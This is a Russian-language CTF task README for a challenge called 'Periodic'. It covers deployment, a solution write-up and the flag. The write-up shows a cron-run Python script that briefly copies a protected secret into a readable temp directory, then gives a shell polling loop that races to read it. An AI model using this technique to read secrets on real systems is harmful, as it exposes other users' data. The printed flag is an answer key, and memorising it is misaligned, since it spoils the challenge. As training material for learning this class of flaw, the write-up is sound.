# medium | admin | periodic

## Название

Periodic

## Описание

> Что-то не так с нашим сервером. Похоже, что кто-то спрятал на нём флаг, но мы не можем его найти. Поможете?
> 
> `ssh -p 25687 challenge@HOST`
> 
> пароль: `challenge`
> 
> _Формат флага: `Sabantuy{...}`._

## Деплой

Запустить контейнеры с таском из папки [deploy/](deploy/), используя docker-compose. Например, так:

```sh
docker-compose up --build -d
```

Таск будет доступен на порту 25687.

## Файлы

Участникам ничего не выдаётся.

## Решение

Нам даётся ssh до сервера. Попадаем в консоль и первым делом смотрим список запущенных процессов:

```
challenge@periodic:/$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  12184  6724 ?        Ss   23:43   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root           8  0.0  0.0   3824  1704 ?        Ss   23:43   0:00 /usr/sbin/cron
root       26986  0.5  0.1  13392  8728 ?        Ss   23:55   0:00 sshd: challenge [priv]
challen+   26989  0.0  0.0  13392  4756 ?        S    23:55   0:00 sshd: challenge@pts/0
challen+   26990  0.0  0.0   6000  3776 pts/0    Ss   23:55   0:00 -bash
challen+   26993  0.0  0.0   7896  3284 pts/0    R+   23:55   0:00 ps -aux
```

Среди процессов виден `/usr/sbin/cron`, значит, на сервере запущен [cron-демон](https://ru.wikipedia.org/wiki/Cron).

Чтобы узнать расписание кронов, прочитаем файл `/etc/crontab`:

```
challenge@periodic:/$ cat etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

К сожалению, файл совершенно стандартный. Скорее всего, нужное расписание где-то в другом месте.

Кроме основного файла `/etc/crontab`, расписание кронов можно также найти в директории `/etc/cron.d/`. Посмотрим, что в ней лежит:

```
challenge@periodic:/$ ls -la /etc/cron.d/
total 20
drwxr-xr-x 1 root root 4096 Sep 25 23:43 .
drwxr-xr-x 1 root root 4096 Sep 25 23:43 ..
-rw-r--r-- 1 root root  102 Feb 13  2020 .placeholder
-rw-r--r-- 1 root root  201 Feb 14  2020 e2scrub_all
-r--r--r-- 1 root root   72 Sep 25 23:38 periodic-script
```

Файл `periodic-script` выглядит интересно: совпадает с названием таска и недавно был изменён. Прочитаем его:

```
challenge@periodic:/$ cat /etc/cron.d/periodic-script 
* *   * * *   challenge-flag   /usr/bin/python3 /var/local/script.py
#
```

Кажется, мы нашли то, что искали: раз в минуту от пользователя `challenge-flag` запускается скрипт `/var/local/script.py`. Взглянем на его код:

```python
#!/usr/bin/env python3

import os
import secrets
import asyncio
import aiofiles


DATA_DIRECTORY = '/var/tmp/data/'
SECRET_FILENAME = '/var/local/secret.txt'


async def main():
    async with aiofiles.open(SECRET_FILENAME, 'r') as file:
        secret = await file.read()

    filename = secrets.token_hex(8)
    secret_path = os.path.join(DATA_DIRECTORY, filename)

    async with aiofiles.open(secret_path, 'w') as file:
        await file.write(secret)

    await asyncio.sleep(1)

    os.unlink(secret_path)

    return


if __name__ == '__main__':
    asyncio.run(main())
```

Скрипт достаточно простой. Он читает секрет из файла `/var/local/secret.txt` и записывает его во временный файл в директории `/var/tmp/data/`, затем ждёт одну секунду и удаляет созданный файл. К сожалению, нам не хватает прав, чтобы прочитать содержимое секрета напрямую:

```
challenge@periodic:/$ ls -la /var/local/
total 24
drwxrwsr-x 1 root           staff          4096 Sep 25 23:43 .
drwxr-xr-x 1 root           root           4096 Aug 27 07:27 ..
-r--r--r-- 1 challenge-flag challenge-flag   17 Sep 25 20:41 requirements.txt
-r-xr--r-- 1 challenge-flag challenge-flag  578 Sep 25 22:20 script.py
-r-------- 1 challenge-flag challenge-flag   59 Sep 25 20:52 secret.txt
```

При этом директория `/var/tmp/data/` доступна для чтения и листинга файлов:

```
challenge@periodic:/$ ls -la /var/tmp/
total 12
drwxrwxrwt 1 root           root           4096 Sep 25 23:43 .
drwxr-xr-x 1 root           root           4096 Aug 27 07:27 ..
drwxr-xr-x 2 challenge-flag challenge-flag   40 Sep 26 00:03 data
```

Решение достаточно очевидное: нужно написать скрипт, который в цикле пытается найти и прочитать созданный файл в директории `/var/tmp/data/`. Так как временной промежуток между созданием и удалением файла равен 1 секунде, можно поставить задержку в 0.5 секунды между итерациями цикла:

```sh
date
directory="/var/tmp/data"
while true; do
    for file in $(ls "${directory}"); do
        path="${directory}/${file}"
        echo "Found file: $path"
        cat "$path"
        exit
    done
    sleep 0.5
done
```

Пример решения: [solve/solution.sh](solve/solution.sh)

## Флаг

```
Sabantuy{bf72a2f9c111798dc1db8b8347dcb80f}
```
